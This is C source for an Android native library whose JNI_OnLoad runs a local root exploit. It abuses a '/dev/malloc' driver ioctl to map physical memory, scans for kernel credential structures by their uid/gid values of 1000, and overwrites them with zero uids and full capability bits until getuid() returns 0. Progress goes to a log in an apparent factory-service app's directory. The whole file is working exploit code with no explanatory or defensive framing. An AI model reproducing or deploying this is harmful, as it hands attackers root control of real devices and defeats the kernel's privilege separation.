typedef unsigned char u8;
typedef unsigned int u32;
typedef unsigned long long u64;
#define SYS_open 5
#define SYS_ioctl 54
#define SYS_mmap2 192
#define SYS_munmap 91
#define SYS_write 4
#define SYS_close 6
#define SYS_fork 2
#define SYS_wait4 114
#define SYS_exit 1
#define SYS_getuid 199
static long sc(long n,long a,long b,long c,long d,long e,long f){
 register long r7 __asm__("r7")=n; register long r0 __asm__("r0")=a;
 register long r1 __asm__("r1")=b; register long r2 __asm__("r2")=c;
 register long r3 __asm__("r3")=d; register long r4 __asm__("r4")=e;
 register long r5 __asm__("r5")=f;
 __asm__ volatile("svc 0":"+r"(r0):"r"(r7),"r"(r1),"r"(r2),"r"(r3),"r"(r4),"r"(r5):"memory");
 return r0;
}
static long lg=-1;
static void put(const char*s){int n=0;while(s[n])n++;if(lg>=0)sc(SYS_write,lg,(long)s,n,0,0,0);}
static void hx(u64 v){char b[19];int i;for(i=0;i<16;i++){int d=(v>>((15-i)*4))&15;b[i]=d<10?48+d:87+d;}b[16]=10;b[17]=0;put(b);}
static void dec(long v){char b[24];int i=23;b[23]=0;if(v==0){put("0");return;}int neg=0;if(v<0){neg=1;v=-v;}while(v){b[--i]=48+v%10;v/=10;}if(neg)b[--i]=45;put(b+i);}
struct info {u64 addr;u64 size;u64 interval;u8 miusel;u8 pad[7];};
#define MPOOL_IOC_SET 0x80204d04u
static unsigned long map_phys(long fd,u64 phys,u64 size){
 if(phys<0x20000000ULL)return 0;
 struct info in; in.addr=phys-0x20000000ULL;in.size=size;in.interval=0;in.miusel=0;in.pad[0]=0;
 if(sc(SYS_ioctl,fd,MPOOL_IOC_SET,(long)&in,0,0,0))return 0;
 long p=sc(SYS_mmap2,0,size,3,1,fd,0);
 if((unsigned long)p>=0xfffff000UL)return 0;
 return (unsigned long)p;
}
static void child(long fd,u64 base,u64 size){
 unsigned long mp=map_phys(fd,base,size); if(!mp)sc(SYS_exit,2,0,0,0,0,0);
 unsigned char *b=(unsigned char*)mp; u32 *w=(u32*)b; u64 i;
 for(i=4;i+0x50<size;i+=4){
  int j; for(j=0;j<8;j++) if(w[(i/4)+j]!=1000) break;
  if(j!=8) continue;
  u32 usage=w[(i/4)-1];
  if(usage<1 || usage>0x10000) continue;
  if(w[(i/4)+8]!=0) continue;
  put("CAND ");hx(base+i);put(" usage ");dec(usage);put("\n");
  u8 save[0x80]; int k; for(k=0;k<0x80;k++) save[k]=b[i-4+k];
  for(k=0;k<8;k++) w[(i/4)+k]=0;
  w[(i/4)+8]=0;
  for(k=9;k<19;k++) w[(i/4)+k]=0xffffffffu;
  if(sc(SYS_getuid,0,0,0,0,0,0)==0){
   put("SUCCESS ");hx(base+i);put("\n"); sc(SYS_exit,42,0,0,0,0,0);
  }
  for(k=0;k<0x80;k++) b[i-4+k]=save[k];
 }
 sc(SYS_munmap,mp,size,0,0,0,0);
 sc(SYS_exit,1,0,0,0,0,0);
}
__attribute__((visibility("default"))) int JNI_OnLoad(void*a,void*b){
 lg=sc(SYS_open,(long)"/data/data/com.cvte.factory.service/files/credscan.log",0x241,0644,0,0,0);
 put("start uid=");dec(sc(SYS_getuid,0,0,0,0,0,0));put("\n");
 long fd=sc(SYS_open,(long)"/dev/malloc",2,0,0,0,0); put("fd=");dec(fd);put("\n");
 if(fd<0)return 0x10006;
 u64 base; int n=0;
 for(base=0x20000000ULL;base<0x92000000ULL;base+=0x200000ULL){
  long pid=sc(SYS_fork,0,0,0,0,0,0);
  if(pid==0)child(fd,base,0x200000ULL);
  int st=0;sc(SYS_wait4,pid,(long)&st,0,0,0,0);
  if((st&0x7f)==0 && ((st>>8)&0xff)==42) {put("ROOT child\n");break;}
  if((n++%64)==0){put("chunk ");hx(base);put(" st ");dec(st);put("\n");}
  if(sc(SYS_getuid,0,0,0,0,0,0)==0){put("ROOT parent\n");break;}
 }
 put("end uid=");dec(sc(SYS_getuid,0,0,0,0,0,0));put("\n");
 return 0x10006;
}
